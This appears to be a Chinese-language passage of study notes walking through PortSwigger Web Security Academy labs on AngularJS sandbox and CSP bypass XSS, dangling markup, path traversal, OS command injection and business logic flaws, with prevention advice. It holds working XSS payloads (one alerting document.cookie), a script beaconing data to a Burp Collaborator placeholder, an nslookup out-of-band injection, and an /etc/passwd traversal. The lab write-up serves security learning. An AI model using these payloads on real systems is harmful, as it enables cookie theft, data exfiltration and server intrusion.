<li><p>客户端模板注入漏洞是指在使用客户端模板框架的应用程序中，动态地将用户输入嵌入到网页中所导致的漏洞。在渲染页面时，框架会扫描页面中的模板表达式，并执行遇到的每个表达式。攻击者可以利用这一点，提供恶意的模板表达式来发起跨站脚本（XSS）攻击。</p>
<p><strong>具体原理</strong>如下：</p>
<ol type="1">
<li>应用程序使用客户端模板框架（例如AngularJS、React等）来构建动态网页。</li>
<li>在构建网页时，应用程序将用户输入作为数据传递给模板引擎。</li>
<li>模板引擎会扫描页面中的模板表达式，并将其替换为对应的数据。</li>
<li>如果用户输入的数据未经充分的验证或过滤，并且直接嵌入到模板表达式中，就可能导致模板注入漏洞。</li>
<li>攻击者可以利用模板注入漏洞构造恶意的模板表达式，其中包含可以执行恶意代码的跨站脚本。</li>
<li>当网页被渲染时，模板引擎会执行恶意的模板表达式，导致恶意代码在用户浏览器中执行，从而实现攻击者的恶意目的，如窃取用户信息、篡改页面内容等。</li>
</ol>
<h6
id="lab-reflected-xss-with-angularjs-sandbox-escape-without-strings-1">Lab:
Reflected XSS with AngularJS sandbox escape without strings</h6>
<ol type="1">
<li><p>Payload</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">search<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>charAt<span class="token operator">%</span>3d<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">|</span>orderBy<span class="token operator">:</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">61</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span></code></pre>
<p><strong>解析：</strong></p>
<ol type="1">
<li><p><code>search=1</code>：将 URL 参数 <code>search</code> 的值设置为
<code>1</code>。这可能是一个标志，用于指示服务器在处理请求时执行特定的操作。</p></li>
<li><p><code>toString().constructor.prototype.charAt%3d[].join</code>：这部分
payload 是一个连续的表达式，主要用于重写 AngularJS 沙箱中的
<code>charAt</code> 函数，使其成为 <code>join</code>
函数。具体解释如下：</p>
<ul>
<li><code>toString()</code>：将当前对象转换为字符串。</li>
<li><code>constructor</code>：获取对象的构造函数。</li>
<li><code>prototype</code>：获取构造函数的原型对象。</li>
<li><code>charAt</code>：原型对象的一个函数，用于返回指定索引位置的字符。</li>
<li><code>%3d</code>：URL 编码中的等号 (<code>=</code>)。</li>
<li><code>[].join</code>：将一个空数组转换为字符串，并使用空字符串连接数组中的元素。这里相当于将
<code>charAt</code> 函数重写为 <code>join</code> 函数。</li>
</ul>
<p>通过将 <code>charAt</code> 函数重写为 <code>join</code> 函数，绕过了
AngularJS 沙箱的限制，从而允许执行更多操作。</p></li>
<li><p><code>[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1</code>：这部分
payload 是一个过滤器操作，用于执行恶意代码。具体解释如下：</p>
<ul>
<li><code>[1]</code>：创建一个数组，这里只包含一个元素
<code>1</code>。</li>
<li><code>orderBy</code>：AngularJS
的过滤器操作符，用于对数组进行排序。在这里使用它来执行恶意代码。</li>
<li><code>toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)</code>：通过调用
<code>toString()</code>
方法获取当前对象的字符串表示，然后获取其构造函数，并使用构造函数的
<code>fromCharCode</code>
方法将一系列字符编码转换为字符串。这里的字符编码是
<code>(120,61,97,108,101,114,116,40,49,41)</code>，对应的是 ASCII
码中的字符 <code>'x=alert(1)'</code>。</li>
<li><code>=1</code>：将刚刚生成的字符串作为参数传递给
<code>orderBy</code> 过滤器，并与 <code>1</code>
进行比较。由于比较操作符 <code>=</code>
的优先级较低，所以先执行了前面的恶意代码。</li>
</ul>
<p>这样，恶意代码 <code>'x=alert(1)'</code> 就会被执行。由于之前重写了
<code>charAt</code> 函数，AngularJS
不会对恶意代码进行沙箱限制，从而允许执行任意操作，例如弹出一个警示框。这可能导致跨站脚本攻击
(XSS) 或其他安全问题。</p></li>
</ol></li>
</ol></li>
<li><p>How does an AngularJS CSP bypass work?</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>input autofocus ng<span class="token operator">-</span>focus<span class="token operator">=</span><span class="token string">"$event.path|orderBy:'[].constructor.from([1],alert)'"</span><span class="token operator">></span></code></pre>
<p><strong>解析：</strong></p>
<ul>
<li><p><code>&lt;input&gt;</code>：HTML
输入元素，表示文本输入框。</p></li>
<li><p><code>autofocus</code>：HTML
属性，指定元素在页面加载时自动获得焦点。</p></li>
<li><p><code>ng-focus</code>：AngularJS
指令，用于在元素获得焦点时触发相应的事件处理函数。</p></li>
<li><p><code>$event</code>：AngularJS
内置变量，表示当前事件对象。</p></li>
<li><p><code>.path</code>：表示事件对象的属性</p>
<p>该属性包含一个对象数组，这些对象会导致事件被执行。数组的最后一个属性始终是
<code>window</code>
对象，我们可以利用它来进行<code>沙箱逃逸</code>。通过将这个数组传递给
orderBy 过滤器，我们可以枚举数组并使用最后一个元素（即 window
对象）来执行<code>全局函数</code>，比如 alert()</p></li>
<li><p><code>|orderBy</code>：AngularJS
过滤器，用于对数组进行排序。</p></li>
<li><p><code>: '[].constructor.from([1],alert)'</code>：orderBy
过滤器的参数，指定排序规则。在这里，使用字符串表示排序规则。</p></li>
<li><p><code>'[].constructor.from([1],alert)'</code>：字符串表示的排序规则，涉及
AngularJS 的特殊语法。</p></li>
<li><p><code>[]</code>：表示一个空数组。</p></li>
<li><p><code>.constructor</code>：表示 JavaScript
中对象的构造函数属性。</p></li>
<li><p><code>.from([1],alert)</code>：利用 constructor 的 from()
函数，将 <code>[1]</code> 转换为数组，并在数组的每个元素上调用 alert()
函数。</p></li>
</ul>
<p>综合起来，该 Payload 在 <code>&lt;input&gt;</code> 元素上绑定了
<code>ng-focus</code> 事件，当元素获得焦点时，会执行
<code>$event.path|orderBy:'[].constructor.from([1],alert)'</code> 这段
AngularJS 表达式。该表达式的作用是通过 orderBy 过滤器对
<code>$event.path</code> 数组进行排序，排序规则使用了 AngularJS
的特殊语法，其中通过构造函数的 from() 函数将 <code>[1]</code>
转换为数组，并在数组的每个元素上调用 alert()
函数。因此，当元素获得焦点时，将执行 alert()
函数，显示一个弹窗。通过利用 AngularJS 的特殊语法和内置变量，实现了 CSP
绕过和执行恶意代码的目的。</p></li>
<li><p><strong>长度限制</strong>的payload</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>alert<span class="token punctuation">)</span></code></pre></li>
</ul>
<h5 id="lab-reflected-xss-with-angularjs-sandbox-escape-and-csp-1">Lab:
Reflected XSS with AngularJS sandbox escape and CSP</h5>
<ul>
<li><p>Payload</p>
<pre class="language-Js" data-language="Js"><code class="language-Js">&lt;script&gt;
location&#x3D;&#39;https:&#x2F;&#x2F;YOUR-LAB-ID.web-security-academy.net&#x2F;?search&#x3D;%3Cinput%20id&#x3D;x%20ng-focus&#x3D;$event.composedPath()|orderBy:%27(z&#x3D;alert)(document.cookie)%27%3E#x&#39;;
&lt;&#x2F;script&gt;</code></pre>
<p><strong>解析：</strong></p>
<p><code>&lt;script&gt;</code>：这是HTML中用于嵌入JavaScript代码的标签。</p>
<p><code>location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';</code>：这是JavaScript代码段，用于重定向当前页面的浏览器位置（URL）。在这里，我们将浏览器的位置设置为一个URL，该URL是我们要利用的实验室的URL，并包含了一个搜索参数。</p>
<p><code>https://YOUR-LAB-ID.web-security-academy.net/?search=</code>：这是实验室的URL，其中<code>YOUR-LAB-ID</code>应该被替换为你的实验室ID。</p>
<p><code>%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x</code>：这是一个经过URL编码的字符串，作为搜索参数传递给实验室的URL。它包含了一个HTML输入元素和AngularJS事件处理器。</p>
<ul>
<li><code>%3C</code>：URL编码表示字符"&lt;"。</li>
<li><code>input%20id=x</code>：定义了一个输入元素，其中<code>id</code>属性设置为"x"。</li>
<li><code>%20</code>：URL编码表示空格。</li>
<li><code>ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27</code>：这是ng-focus事件处理器的定义，它会在输入元素获得焦点时触发。在这里，我们使用了<code>$event.composedPath()</code>来获取事件对象的路径，并通过管道符号（|）将其传递给orderBy过滤器。</li>
<li><code>:</code>：表示过滤器的参数分隔符。</li>
<li><code>%27</code>：URL编码表示单引号（'）。</li>
<li><code>(z=alert)(document.cookie)</code>：这是一个JavaScript表达式，我们将alert函数赋值给了变量z，并调用document.cookie来获取当前页面的Cookie值。</li>
<li><code>%27</code>：URL编码表示单引号（'）。</li>
<li><code>%3E</code>：URL编码表示字符"&gt;"。</li>
<li><code>#x</code>：URL片段标识符，表示锚点为"x"。</li>
</ul>
<p><code>&lt;/script&gt;</code>：这是HTML中用于结束JavaScript代码段的标签。</p>
<p>总而言之，这段payload的作用是在实验室的URL中发起一个搜索请求，搜索参数中包含了一个特殊的输入元素和AngularJS事件处理器。该处理器通过管道符号将事件路径传递给orderBy过滤器，并在路径中达到window对象时执行一个JavaScript表达式，以弹出当前页面的Cookie值。</p></li>
</ul>
<h5 id="summary">Summary</h5>
<ul>
<li><p>反射型XSS（<code>Reflected XSS</code>）和存储型XSS（<code>Stored XSS</code>）之间的区别在于数据的处理方式和嵌入点的时机。</p>
<p>反射型XSS发生在应用程序从HTTP请求中获取某些输入，并以不安全的方式将该输入嵌入到<strong>即时响应</strong>中。这种类型的攻击通常是通过构造恶意的URL或表单提交来实现的。当用户点击恶意链接或提交恶意表单时，应用程序会在响应中反射显示恶意代码，从而导致攻击成功。</p>
<p>而存储型XSS则是应用程序将输入数据存储在服务器端，并在后续的响应中以不安全的方式将其嵌入。这种类型的攻击通常发生在用户输入的内容被存储在<strong>数据库或文件</strong>中，并在其他用户访问相关页面时被提取和展示。攻击者可以在输入中注入恶意代码，当其他用户浏览受影响的页面时，恶意代码会被执行，从而实现攻击。</p>
<p>总结而言，反射型XSS在即时响应中嵌入恶意代码，而存储型XSS将输入数据存储起来，并在后续的响应中嵌入恶意代码。<strong>存储型XSS</strong>的攻击影响范围更广，因为恶意代码可以被多个用户访问到。</p></li>
<li><p>以下是各种类型的XSS攻击的<strong>举例</strong>说明：</p>
<ol type="1">
<li>反射型XSS（Reflected XSS）：
<ul>
<li>攻击者构造一个恶意的URL，其中包含注入恶意脚本的参数。当用户点击该URL时，服务器将恶意脚本反射到响应中，并在用户的浏览器中执行。例如：<code>http://example.com/search?query=&lt;script&gt;alert('Reflected XSS')&lt;/script&gt;</code></li>
</ul></li>
<li>存储型XSS（Stored XSS）：
<ul>
<li>攻击者在一个公共留言板中提交一个包含恶意脚本的留言。当其他用户查看该留言时，服务器从数据库中检索并返回该留言的内容，并在其他用户的浏览器中执行恶意脚本。例如：在留言板中提交内容为<code>&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</code>的留言。</li>
</ul></li>
<li>DOM型XSS（DOM-based XSS）：
<ul>
<li>攻击者构造一个特定的URL，当用户点击该URL时，浏览器会执行JavaScript代码，该代码修改页面的DOM结构，导致恶意脚本的执行。例如：<code>http://example.com/#&lt;script&gt;document.getElementById('myElement').innerHTML='DOM-based XSS'&lt;/script&gt;</code></li>
</ul></li>
<li>自我XSS（Self-XSS）：
<ul>
<li>攻击者通过社交工程手段欺骗用户自行执行恶意代码。例如，攻击者在社交媒体上发布一条消息，声称这是一个有趣的JavaScript代码片段，诱使用户将该代码片段复制粘贴到自己的浏览器控制台中执行。一旦用户执行了这段代码，就可能触发自我XSS攻击，执行恶意操作，例如窃取用户的登录凭证。</li>
</ul></li>
</ol></li>
</ul>
<h4 id="content-security-policy-1">Content security policy</h4>
<h5
id="lab-reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack-2">Lab:
Reflected XSS protected by very strict CSP, with dangling markup
attack</h5>
<ol type="1">
<li><p>发现xss漏洞<img
src="https://s2.loli.net/2023/05/28/3Jhro5Z16wRsDXN.png"
alt="image-20230528170902507" /></p></li>
<li><p>绕过<code>CSP</code>获取CSRF</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
<span class="token keyword">if</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">'//BURP-COLLABORATOR-SUBDOMAIN?'</span><span class="token operator">+</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		location <span class="token operator">=</span> <span class="token string">'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%/web-security/cross-site-scripting/content-security-policy/22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>

<span class="token comment">// 上述中的“/web-security/cross-site-scripting/content-security-policy/”得去掉</span>
否则burp collaborator无响应

<span class="token comment">// 其中的三个替换字段需注意</span></code></pre></li>
<li><p>burp collaborator<img
src="https://s2.loli.net/2023/05/28/QBKNe7ws3OWljEC.png"
alt="image-20230528171604698" /></p></li>
<li><p>burp proxy抓包网站的email update报文<img
src="https://s2.loli.net/2023/05/28/XBarp17snGdxvJq.png"
alt="image-20230528171933498" /></p></li>
<li><p>csrf poc 生成<img
src="https://s2.loli.net/2023/05/28/ynqIeFZ3NgCtwrB.png"
alt="image-20230528172059242" /></p></li>
<li><p>将html 粘贴到server中</p></li>
<li><p>两次使用的payload 原理难以理解</p></li>
</ol>
<h5 id="lab-reflected-xss-protected-by-csp-with-csp-bypass-1">Lab:
Reflected XSS protected by CSP, with CSP bypass</h5>
<ol type="1">
<li><p>试探搜索框<img
src="https://s2.loli.net/2023/06/07/5zNe9kqRmKfbiGB.png"
alt="image-20230607174819339" /></p>
<p>检查响应和CSP设置：通过Burp
Proxy观察到服务器返回的响应中包含了Content-Security-Policy头，其中的<strong>report-uri</strong>指令包含了一个名为token的参数。这个参数可以被恶意用户控制，并可以用于注入<strong>自定义的CSP指令</strong>。</p></li>
<li><p>利用CSP指令注入：恶意用户访问一个特定的URL，该URL中包含了之前搜索框中注入的恶意脚本作为搜索内容，并且通过token参数注入了CSP指令
<code>;script-src-elem 'unsafe-inline'</code>。这个指令使用了CSP中的script-src-elem指令，它允许控制页面中的script元素，包括内联脚本。通过这个指令，恶意用户成功覆盖了现有的script-src规则，并将其设置为允许内联脚本的加载<img
src="https://s2.loli.net/2023/06/07/WxhHydkewDsTZMG.png"
alt="image-20230607175620124" /></p></li>
</ol>
<h5 id="dangling-markup-injection-1">Dangling markup injection</h5>
<p>悬空标记注入（Dangling Markup
Injection）是一种在无法进行完整的跨站脚本（XSS）攻击的情况下，利用输入过滤或其他防御措施的漏洞来跨域捕获数据的技术。它通常被利用来获取对其他用户可见的敏感信息，包括可以用于代表用户执行未经授权操作的CSRF令牌。</p>
<p>当应用程序以不安全的方式将可控数据嵌入其响应中时，悬空标记注入就可能发生。攻击者可以利用未过滤或转义"&gt;"或"""字符的情况下，通过注入特定的语法，从引号包围的属性值和封闭标签中跳出，返回到HTML上下文。</p>
<p>悬空标记注入攻击通常使用一些特定的标签或属性，例如img标签的src属性。攻击者可以创建一个img标签，定义src属性的开始，并在其中插入指向自己服务器的URL。重要的是，攻击载荷不会关闭src属性，使其“悬空”。当浏览器解析响应时，它会一直向前查找，直到遇到一个单引号来终止属性。在此之前的所有内容都将被视为URL的一部分，并在URL查询字符串中发送到攻击者的服务器。任何进行外部请求的属性都可以用于悬空标记注入。</p>
<p>悬空标记注入的后果是攻击者可以捕获注入点后面部分的应用程序响应，其中可能包含敏感数据。根据应用程序的功能，这可能包括CSRF令牌、电子邮件消息或财务数据等。</p>
<p>因此，为了防止悬空标记注入攻击，应采取适当的输入过滤和输出编码措施，并使用安全的开发实践来确保应用程序正确处理和验证用户输入。</p>
<h4 id="how-to-prevent-xss-attacks">How to prevent XSS attacks</h4>
<ul>
<li><p>防止跨站脚本攻击（XSS）在某些情况下很容易，但根据应用程序的复杂性和处理用户可控数据的方式，可能会更加困难。</p>
<p>一般来说，有效地防止XSS漏洞可能需要采取以下措施的组合：</p>
<ol type="1">
<li>在数据输入时进行过滤：在接收用户输入的地方，根据预期或有效输入进行严格的过滤处理。</li>
<li>在数据输出时进行编码：在将用户可控数据输出到HTTP响应中时，对输出进行编码，以防止其被解释为活动内容。根据输出的上下文，可能需要应用HTML、URL、JavaScript和CSS编码的组合。</li>
<li>使用适当的响应头：为了防止非HTML或JavaScript内容的HTTP响应中发生XSS，可以使用Content-Type和X-Content-Type-Options头来确保浏览器按照您的意图解释响应。</li>
<li>内容安全策略（Content Security
Policy）：作为最后的防线，您可以使用内容安全策略（CSP）来减轻任何仍然存在的XSS漏洞的严重程度。</li>
</ol></li>
<li><p>白名单与黑名单
在输入验证中，通常应使用白名单而不是黑名单。例如，与其试图列出所有有害的协议（例如javascript、data等），只需列出安全的协议（如HTTP、HTTPS），并禁止列表之外的任何协议。这样做可以确保您的防御不会在新的有害协议出现时被破坏，并且能够更少地受到那些试图混淆无效值以逃避黑名单的攻击的影响。</p></li>
</ul>
<h4 id="common-questions-about-cross-site-scripting">Common questions
about cross-site scripting</h4>
<ul>
<li><strong>What is the difference between XSS and CSRF?</strong> XSS
involves causing a web site to return malicious JavaScript, while CSRF
involves inducing a victim user to perform actions they do not intend to
do.</li>
</ul>
<h3 id="directory-traversal">Directory traversal</h3>
<h5 id="lab-file-path-traversal-simple-case">Lab: File path traversal,
simple case</h5>
<ol type="1">
<li>请求一张图片<img
src="https://s2.loli.net/2023/08/09/mafC76K4cnVYAJZ.png"
alt="image-20230809002452209" /></li>
<li>修改参数值<img
src="https://s2.loli.net/2023/08/09/fqzvpN97HxJQe8g.png"
alt="image-20230809002525622" /></li>
</ol>
<h5
id="lab-file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass">Lab:
File path traversal, traversal sequences blocked with absolute path
bypass</h5>
<ol type="1">
<li>使用从文件系统根目录开始的绝对路径，比如<code>filename=/etc/passwd</code>，来直接引用文件，而无需使用任何遍历序列。这样的绕过方式可能是因为应用程序可能只关注遍历序列，而忽略了绝对路径的潜在威胁。<img
src="https://s2.loli.net/2023/08/09/ewU1RjhbOsxTYPl.png"
alt="image-20230809003207520" /></li>
</ol>
<h5
id="lab-file-path-traversal-traversal-sequences-stripped-non-recursively">Lab:
File path traversal, traversal sequences stripped non-recursively</h5>
<ol type="1">
<li>双重是因为检测只有一重？<img
src="https://s2.loli.net/2023/08/09/EoFmAZNyM4Kx9Lc.png"
alt="image-20230809003555999" /></li>
</ol>
<h5
id="lab-file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode">Lab:
File path traversal, traversal sequences stripped with superfluous
URL-decode</h5>
<ol type="1">
<li>编码绕过<img
src="https://s2.loli.net/2023/08/09/3GEXMUuBFpjNn8b.png"
alt="image-20230809005237898" /></li>
</ol>
<h5 id="lab-file-path-traversal-validation-of-start-of-path">Lab: File
path traversal, validation of start of path</h5>
<ol type="1">
<li>基本目录<img
src="https://s2.loli.net/2023/08/09/CFE8sRAdoZqaL9u.png"
alt="image-20230809005226467" /></li>
</ol>
<h5
id="lab-file-path-traversal-validation-of-file-extension-with-null-byte-bypass">Lab:
File path traversal, validation of file extension with null byte
bypass</h5>
<ol type="1">
<li><code>%00</code>
是空字节的URL编码形式。当应用程序试图检查文件名的扩展名时，空字节会终止字符串的比较，从而使应用程序认为文件名是以期望的扩展名结尾的<img
src="https://s2.loli.net/2023/08/09/4mrab2F9zPctONE.png"
alt="image-20230809005900021" /></li>
</ol>
<h3 id="os-command-injection">OS command injection</h3>
<h4 id="executing-arbitrary-commands">Executing arbitrary commands</h4>
<h5 id="lab-os-command-injection-simple-case">Lab: OS command injection,
simple case</h5>
<ol type="1">
<li>simple case<img
src="https://s2.loli.net/2023/08/09/QHCtLKul9WZFnh6.png"
alt="image-20230809065256169" /></li>
</ol>
<h4 id="blind-os-command-injection-vulnerabilities">Blind OS command
injection vulnerabilities</h4>
<h5 id="lab-blind-os-command-injection-with-time-delays">Lab: Blind OS
command injection with time delays</h5>
<ol type="1">
<li>发送10个<code>ping</code>包，响应耗时10s现象<img
src="https://s2.loli.net/2023/08/09/scxPvrb4C5eXwIV.png"
alt="image-20230809070142771" /></li>
</ol>
<h5 id="lab-blind-os-command-injection-with-output-redirection">Lab:
Blind OS command injection with output redirection</h5>
<ol type="1">
<li>修改email参数值<img
src="https://s2.loli.net/2023/08/09/Jys1lGr7SNU8nCR.png"
alt="image-20230809071210946" /></li>
<li>请求文件<img
src="https://s2.loli.net/2023/08/09/2XDWxwnAlcMI1rT.png"
alt="image-20230809071228715" /></li>
</ol>
<h5
id="lab-blind-os-command-injection-with-out-of-band-interaction">Lab:
Blind OS command injection with out-of-band interaction</h5>
<ol type="1">
<li><p>payload</p>
<pre class="language-none"><code class="language-none">email&#x3D;x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||</code></pre>
<p>在这个命令注入+DNS数据泄露的payload中,<code>x.BURP-COLLABORATOR-SUBDOMAIN</code>
这个参数有以下作用:</p>
<ol type="1">
<li><p>x 是随意的主机名,没有实际作用,仅用于占位。</p></li>
<li><p>BURP-COLLABORATOR-SUBDOMAIN 是Burp
Suite的Collaborator服务器的子域名。</p></li>
<li><p>Collaborator服务器可以将发往其子域名的任何请求转发给攻击者。</p></li>
<li><p>因此,被注入的nslookup命令会向这个 subdomain
发起DNS查询请求。</p></li>
<li><p>该请求会被转发给攻击者的Burp
Suite,以此实现命令输出的out-of-band泄露。</p></li>
<li><p>攻击者可以在Burp的DNS历史中获取查询结果,并分析命令执行返回的数据。</p></li>
</ol>
<figure>
<img src="https://s2.loli.net/2023/08/09/7tiwTWK1vXEDFdZ.png"
alt="image-20230809105417745" />
<figcaption aria-hidden="true">image-20230809105417745</figcaption>
</figure></li>
</ol>
<h5
id="lab-blind-os-command-injection-with-out-of-band-data-exfiltration">Lab:
Blind OS command injection with out-of-band data exfiltration</h5>
<ol type="1">
<li>第三方服务器<img
src="https://s2.loli.net/2023/08/09/8QirVvapoL6WKAc.png"
alt="image-20230809111705443" /></li>
<li>查看服务器接收到的请求<img
src="https://s2.loli.net/2023/08/09/JUv7z9LojmFyQRs.png"
alt="image-20230809111722457" /></li>
</ol>
<h5 id="ways-of-injecting-os-commands">Ways of injecting OS
commands</h5>
<ol type="1">
<li><p>操作系统命令注入可以通过多种特殊字符来实现,主要包括:</p>
<p>命令分隔符,可以连接多个命令:</p>
<ul>
<li>&amp;</li>
<li>&amp;&amp;</li>
<li><div class="line-block"></div></li>
<li>||</li>
</ul>
<p>仅Unix系统支持的分隔符:</p>
<ul>
<li>;</li>
<li>换行符(0x0a 或 )</li>
</ul>
<p>Unix系统也支持:</p>
<ul>
<li>反引号,实现内联命令执行</li>
<li>$(命令),执行嵌套的命令</li>
</ul>
<p>不同分隔符的行为稍有不同,可能影响命令执行和输出获取。</p>
<p>如果控制的输入在引号中,需要先终止引号后再注入。</p></li>
</ol>
<h3 id="business-logic-vulnerabilities">Business logic
vulnerabilities</h3>
<h4 id="what-are-business-logic-vulnerabilities">What are business logic
vulnerabilities?</h4>
<ol type="1">
<li><strong>业务逻辑漏洞</strong>是应用程序设计和实现中的缺陷，允许攻击者引发意外行为。这可能使攻击者能够操纵合法功能来实现恶意目标。这些缺陷通常是由于未能预见可能发生的异常应用程序状态而导致的，因此未能安全地处理它们。</li>
</ol>
<h4 id="how-do-business-logic-vulnerabilities-arise">How do business
logic vulnerabilities arise?</h4>
<ol type="1">
<li>业务逻辑漏洞通常是因为设计和开发团队对用户如何与应用程序交互产生了<strong>错误的假设</strong>而产生的。这些错误的假设可能导致对<strong>用户输入的验证</strong>不足，从而创建了攻击者可以利用的安全漏洞。</li>
</ol>
<h4 id="lab-excessive-trust-in-client-side-controls">Lab: Excessive
trust in client-side controls</h4>
<ol type="1">
<li>购物车请求：修改价格<img
src="https://s2.loli.net/2023/08/09/rgpEAwZ5WoeIFml.png"
alt="image-20230809222303055" /></li>
</ol>
<h4 id="lab-high-level-logic-vulnerability">Lab: High-level logic
vulnerability</h4>
<ol type="1">
<li>必须包括这件商品：<strong>Lightweight "l33t" Leather
Jacket</strong></li>
<li>quatatity修改为负数,使得<strong>总金额小于自己的余额</strong><img
src="https://s2.loli.net/2023/08/09/ZxLBAW3XRGDyQ4s.png"
alt="image-20230809231305578" /><img
src="https://s2.loli.net/2023/08/09/tHYNx14Jb3ofQdE.png"
alt="image-20230809231437035" /></li>
</ol>
<h4 id="lab-low-level-logic-flaw">Lab: Low-level logic flaw</h4>
<ol type="1">
<li><p>依然是针对商品 <strong>Lightweight "l33t" Leather
Jacket</strong></p></li>
<li><p>payload设置，不需要<code>$$</code>标记<img
src="https://s2.loli.net/2023/08/10/WT8wxdhviaDAeSZ.png"
alt="image-20230810001758888" /></p></li>
<li><p>刷新页面，发现总金额在最大值正数和最小负数之间循环<img
src="https://s2.loli.net/2023/08/10/ZqJIYUd2WBwGegF.png"
alt="image-20230810001915266" /></p></li>
<li><p>设置为单线程<img
src="https://s2.loli.net/2023/08/10/i27krtQVe4lsaCg.png"
alt="image-20230810002140658" /></p></li>
<li><p>凑数到低于100美元（你的余额）的正数<img
src="https://s2.loli.net/2023/08/10/MXpeqEk6lHW9QCR.png"
alt="image-20230810002223489" /></p></li>
</ol>
<h4 id="lab-inconsistent-handling-of-exceptional-input">Lab:
Inconsistent handling of exceptional input</h4>
<ol type="1">
<li><p>burpsuite 中的目录扫描</p>
<ol type="1">
<li><figure>
<img src="https://s2.loli.net/2023/08/10/UjiQRFE7Lv25hDs.png"
alt="image-20230810010138152" />
<figcaption aria-hidden="true">image-20230810010138152</figcaption>
</figure></li>
<li><p>点击<img src="https://s2.loli.net/2023/08/10/hWVzdKSsGBYvcNp.png"
alt="image-20230810010254133" /></p></li>
<li><p>sitemap tab,发现admin子目录<img
src="https://s2.loli.net/2023/08/10/ACsQ9kEaz5WIJjv.png"
alt="image-20230810010327258" /></p></li>
<li><p>访问/admin，发现<strong>DontWanaCry</strong></p></li>
</ol></li>
<li><p>注册账号</p>
<ol type="1">
<li><p>使用一个超长邮箱注册</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url"><span class="token path"><span class="token path-separator">/</span>register</span></span> <span class="token http-version property">HTTP/2</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">0a2b00240301573a8226b6c600a20042.web-security-academy.net</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">session=gJQODMRLEvXwfCUZJzL1HXvUiRkcRAwY</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">2260</span></span>
<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Ch-Ua</span><span class="token punctuation">:</span> <span class="token header-value">"Not A(Brand";v="24", "Chromium";v="110"</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Ch-Ua-Mobile</span><span class="token punctuation">:</span> <span class="token header-value">?0</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Ch-Ua-Platform</span><span class="token punctuation">:</span> <span class="token header-value">"Windows"</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">https://0a2b00240301573a8226b6c600a20042.web-security-academy.net</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.97 Safari/537.36</span></span>
